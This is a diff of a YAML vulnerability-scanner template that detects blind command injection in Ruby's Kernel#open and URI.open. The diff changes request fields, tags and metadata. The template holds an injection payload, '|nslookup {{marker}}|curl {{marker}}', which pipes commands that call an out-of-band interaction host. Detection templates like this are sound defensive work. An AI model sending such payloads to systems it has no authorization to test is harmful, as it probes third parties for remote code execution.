@@ -8,13 +8,12 @@ http:
     type: word
     words:
     - dns
+  method: GET
+  path:
+  - '{{BaseURL}}'
   payloads:
     interaction:
     - '|nslookup {{marker}}|curl {{marker}}'
-  pre-condition:
-  - dsl:
-    - method == "GET"
-    type: dsl
   stop-at-first-match: true
 id: cmdi-ruby-open-rce
 info:
@@ -23,13 +22,11 @@ info:
     \ process invocation by prefixing a pipe symbol (e.g., open(\u201C| ls\u201D)).\
     \ So, it may lead to Remote Code Execution by using variable input to the argument\
     \ of Kernel#open and URI.open.\n"
-  metadata:
-    max-request: 1
   name: Ruby Kernel#open/URI.open RCE
   reference:
   - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
   - https://codeql.github.com/codeql-query-help/ruby/rb-kernel-open/
   severity: high
-  tags: cmdi,oast,dast,blind,ruby,rce,vuln
+  tags: cmdi,oast,dast,blind,ruby,rce
 variables:
   marker: '{{interactsh-url}}'
